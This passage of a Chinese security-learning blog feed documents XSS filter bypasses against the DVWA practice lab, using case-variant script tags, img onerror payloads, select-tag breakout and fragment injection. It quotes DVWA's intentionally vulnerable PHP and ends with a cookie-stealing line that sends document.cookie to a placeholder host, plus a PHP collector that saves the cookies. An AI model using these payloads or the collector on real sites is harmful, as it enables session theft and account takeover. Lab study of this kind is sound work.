class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第8行是对评论消息做过滤，非常全面，无懈可击</p><p>第14行对名字做过滤，只替换script标签，老毛病了。实战很难遇到这种代码。</p><h3 id="安全等级：high"><a href="#安全等级：high" class="headerlink" title="安全等级：high"></a>安全等级：high</h3><h4 id="猜测与尝试-1"><a href="#猜测与尝试-1" class="headerlink" title="猜测与尝试"></a>猜测与尝试</h4><p>故技重施：</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416161212287.png" alt="image-20230416161212287"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416161342846.png" alt="image-20230416161342846"></p><p>成功 img标签真好用。</p><h4 id="查看源码-1"><a href="#查看源码-1" class="headerlink" title="查看源码"></a>查看源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第15行，还是只过滤了script标签，其他标签没过滤</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>img比script标签  更好用，但是如果做了addslashes、strip_tags、htmlspecialchars三重过滤 这就有点麻烦了</p>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> XSS跨站脚本攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS的绕过姿势（二）</title>
      <link href="/2023/04/16/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2023/04/16/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS的绕过姿势（二）"><a href="#XSS的绕过姿势（二）" class="headerlink" title="XSS的绕过姿势（二）"></a>XSS的绕过姿势（二）</h1><p>本章提及的几种姿势将在dvwa靶场进行演示</p><h2 id="文本框反射型XSS的绕过姿势"><a href="#文本框反射型XSS的绕过姿势" class="headerlink" title="文本框反射型XSS的绕过姿势"></a>文本框反射型XSS的绕过姿势</h2><h3 id="安全的等级：Medium"><a href="#安全的等级：Medium" class="headerlink" title="安全的等级：Medium"></a>安全的等级：Medium</h3><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230415232835425.png" alt="image-20230415232835425"></p><p>URL:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_r/?name=XXX#</span><br></pre></td></tr></table></figure><h4 id="猜测与尝试"><a href="#猜测与尝试" class="headerlink" title="猜测与尝试"></a>猜测与尝试</h4><p>肯定有过滤，但不知道过滤了什么</p><p>先简单试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_r/?name=&lt;script&gt;alert(1)&lt;/script&gt;#</span><br></pre></td></tr></table></figure><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230415233315874.png" alt="image-20230415233315874"></p><p>回显的script标签消失了，可能是被过滤掉了。</p><p>猜测是黑名单过滤，先试试大小写绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_r/?name=&lt;sCript&gt;alert(1)&lt;/script&gt;#</span><br></pre></td></tr></table></figure><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230415233611533.png" alt="image-20230415233611533"></p><p>成功 推测是简单过滤掉了script标签。</p><p>php源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello <span class="subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>果然</p><h3 id="安全等级high"><a href="#安全等级high" class="headerlink" title="安全等级high"></a>安全等级high</h3><h4 id="猜测与尝试-1"><a href="#猜测与尝试-1" class="headerlink" title="猜测与尝试"></a>猜测与尝试</h4><p>故技重施</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_r/?name=&lt;sCript&gt;alert(1)&lt;/script&gt;#</span><br></pre></td></tr></table></figure><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416000229385.png" alt="image-20230416000229385"></p><p>果然失败</p><p>注意到还留下了个右尖括号</p><p>换img标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_r/?name=&lt;img src=1 onerror=&quot;alert(1)&quot;&gt;#</span><br></pre></td></tr></table></figure><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416000456771.png" alt="image-20230416000456771"></p><p>成功了！ 这是我没想到的，这么low……</p><p>看来还是对黑名单过滤script标签。。</p><p>看下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello <span class="subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>原来是直接把符合这条正则的串给替换掉</p><p>那绕过方法可多了去了。。</p><p>例如各种js事件 onclick onerror之类的</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>dvwa的反射型有点水……emmm</p>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> XSS跨站脚本攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS的绕过姿势（一）</title>
      <link href="/2023/04/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/04/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="xss的绕过姿势（一）"><a href="#xss的绕过姿势（一）" class="headerlink" title="xss的绕过姿势（一）"></a>xss的绕过姿势（一）</h1><p>本章提及的几种姿势将在dvwa靶场进行演示</p><h2 id="下拉列表DOM型XSS的绕过姿势"><a href="#下拉列表DOM型XSS的绕过姿势" class="headerlink" title="下拉列表DOM型XSS的绕过姿势"></a>下拉列表DOM型XSS的绕过姿势</h2><h3 id="安全等级：Medium"><a href="#安全等级：Medium" class="headerlink" title="安全等级：Medium"></a>安全等级：Medium</h3><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413193725293.png" alt="image-20230413193725293"></p><p>URL:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_d/?default=English</span><br></pre></td></tr></table></figure><h4 id="猜测与尝试"><a href="#猜测与尝试" class="headerlink" title="猜测与尝试"></a>猜测与尝试</h4><p>注意到有下拉列表，且在URL中修改default=后面的值时能回显至页面的下拉列表中</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_d/?default=xxxxxxxx</span><br></pre></td></tr></table></figure><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413194753854.png" alt="image-20230413194753854"></p><p>尝试提交payload</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413195409867.png" alt="image-20230413195409867"></p><p>提交后发现default后面的值又变回English了</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413195320527.png" alt="image-20230413195320527"></p><p>猜测是做了过滤，检测到尖括号或者关键词就替换回  English</p><p>查看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span> (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>原来是检测到  &lt;script  就马上重定向</p><p>尝试大小写绕过</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413195758325.png" alt="image-20230413195758325"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413195832077.png" alt="image-20230413195832077"></p><p>失败，查资料后发现stripos()函数是不区分大小写的</p><blockquote><p>stripos () 函数查找字符串在另一字符串中第一次出现的位置（<strong>不区分大小写</strong>）。 注释： stripos () 函数是不区分大小写的。</p></blockquote><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>注意到关键点：下拉列表</p><p>下拉列表html源码如下</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413200331330.png" alt="image-20230413200331330"></p><p>考虑让下拉列表提前闭合，让回显的选项暴露在外。</p><p>闭合直接闭合 select 标签“：(不用担心没有闭合option标签，浏览器很智能的，会给你补全)</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413200945750.png" alt="image-20230413200945750"></p><p>成功，选项都暴露在外边了</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413201246205.png" alt="image-20230413201246205"></p><p>那么换成xss代码（script标签被过滤了，换img标签）</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413201427653.png" alt="image-20230413201427653"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413201516611.png" alt="image-20230413201516611"></p><p>成功。</p><h3 id="安全等级：high"><a href="#安全等级：high" class="headerlink" title="安全等级：high"></a>安全等级：high</h3><h4 id="猜测与尝试-1"><a href="#猜测与尝试-1" class="headerlink" title="猜测与尝试"></a>猜测与尝试</h4><p>难度提升，继续上传上面构造的payload</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413202039408.png" alt="image-20230413202039408"></p><p>马上被重定向了</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413202111895.png" alt="image-20230413202111895"></p><p>猜测1：img标签被过滤</p><p>猜测2：select标签被过滤</p><p>猜测3：无论在default后面加什么都不会生效</p><p>进行验证：</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413202252042.png" alt="image-20230413202252042"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413202617389.png" alt="image-20230413202617389"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413202324322.png" alt="image-20230413202324322"></p><p>发现无论在default后面输入什么都会被重定向</p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原来是进行了白名单过滤，只允许提交以上的值</p><h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h4><p>锚点注入技术的运用</p><blockquote><p>锚点注入： 在URL的井号后面添加JavaScript脚本是一种称为“锚点注入”的技术，它可以实现在页面加载时执行JavaScript代码。但是，这种技术并不是所有浏览器都支持，而且也存在一些安全风险。</p><p>如果浏览器支持锚点注入，那么在URL的井号后面添加JavaScript脚本是可以运行的。例如，以下URL会在页面加载时弹出一个警告框：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/page.html#&lt;script&gt;alert(&#x27;Hello, world!&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>但是，为了保证网站的安全性，大多数现代浏览器已经禁止了锚点注入这种技术。因此，不建议在URL中使用锚点注入来执行JavaScript代码，而应该使用更安全的方法，如在HTML文档中嵌入JavaScript代码或在外部JavaScript文件中编写代码。</p></blockquote><p>关键： 在井号后面添加javascript脚本</p><p>在URL后面加井号，在井号后面随便加点什么</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413204816325.png" alt="image-20230413204816325"></p><p>没有被重定向！</p><p>接下来 换成js脚本</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413204911747.png" alt="image-20230413204911747"></p><p>第一次回车没反应，第二次回车成功执行alert语句</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413205049632.png" alt="image-20230413205049632"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413210134469.png" alt="image-20230413210134469"></p><p>这是是GPT关于我以上疑问的解释。<strong>我信你个鬼！！！！</strong></p><p>还得靠自己琢磨：</p><h4 id="分析新的问题"><a href="#分析新的问题" class="headerlink" title="分析新的问题"></a>分析新的问题</h4><p>在井号后面随便加点什么东西：如aaaa</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413210940178.png" alt="image-20230413210940178"></p><p>发现第一次回车时，页面下拉列表选中的还是English</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413211120141.png" alt="image-20230413211120141"></p><p>第二次回车时，下拉列表中才变成English#aaaa</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413211219895.png" alt="image-20230413211219895"></p><p>STFW，看到了这个</p><blockquote><p>仅改变井号后面的内容，只会使浏览器滚动到相应的位置，并不会重现加载页面。</p></blockquote><p>改变策略，同样在井号输入aaaa。但是只回车一次，没反应。然后右键，重新加载</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413213050839.png" alt="image-20230413213050839"></p><p>起到了和两次回车一样的效果：</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413213131563.png" alt="image-20230413213131563"></p><p>可见改变井号后面的内容，然后回车时，这属于是修改操作，没有重新加载页面。</p><p>而点击URL，再次按回车时，此时的回车会导致页面重新加载。</p><p>所以会不会是因为缓存的原因？</p><p>再次请GPT出山</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413213225519.png" alt="image-20230413213225519"></p><p>第一次回车时，由于没有重新加载页面，此时井号后面添加的脚本还没有被缓存到浏览器</p><p>第二次回车时，浏览器重新加载了页面，此时井号后面的脚本被缓存到了浏览器，并被加载执行。</p><h4 id="问题解决。"><a href="#问题解决。" class="headerlink" title="问题解决。"></a>问题解决。</h4><h2 id="题外话：问GPT一个问题时，不要轻信第一次的回答，多问几次，自己再上网求证。"><a href="#题外话：问GPT一个问题时，不要轻信第一次的回答，多问几次，自己再上网求证。" class="headerlink" title="题外话：问GPT一个问题时，不要轻信第一次的回答，多问几次，自己再上网求证。"></a>题外话：问GPT一个问题时，不要轻信第一次的回答，多问几次，自己再上网求证。</h2>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> XSS跨站脚本攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS盗取cookie</title>
      <link href="/2023/04/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9B%97%E5%8F%96cookie/"/>
      <url>/2023/04/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9B%97%E5%8F%96cookie/</url>
      
        <content type="html"><![CDATA[<h1 id="xss盗取cookie"><a href="#xss盗取cookie" class="headerlink" title="xss盗取cookie"></a>xss盗取cookie</h1><h2 id="cookie概念"><a href="#cookie概念" class="headerlink" title="cookie概念"></a>cookie概念</h2><blockquote><p>cookie是在http协议下，由web服务器保存在用户客户端上的小文本文件，常包含有关用户的信息</p></blockquote><h2 id="盗取cookie关键代码"><a href="#盗取cookie关键代码" class="headerlink" title="盗取cookie关键代码"></a>盗取cookie关键代码</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;http://ip/cookie.php?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br></pre></td></tr></table></figure><p>cookie.php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;cookie.txt&#x27;</span>,<span class="variable">$cookie</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="但是……在实操时遇到了点问题"><a href="#但是……在实操时遇到了点问题" class="headerlink" title="但是……在实操时遇到了点问题"></a>但是……在实操时遇到了点问题</h2><p>我在WWW根目录下新建了个文件夹cookieCatch，在里面写了一个cookie.php，新建了个cookie.txt放弹回来的cookie。</p><p><img 